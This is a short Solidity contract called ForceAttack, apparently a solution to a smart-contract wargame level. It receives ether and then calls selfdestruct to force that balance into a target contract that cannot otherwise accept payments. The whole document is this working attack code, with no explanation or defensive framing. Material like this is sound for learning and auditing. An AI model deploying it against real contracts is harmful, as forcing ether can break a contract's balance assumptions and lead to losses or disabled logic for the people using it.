pragma solidity ^0.4.18;

contract ForceAttack {

  function ForceAttack() payable {}
  function() payable {}

  function attack(address target) {
    selfdestruct(target);
  }
}
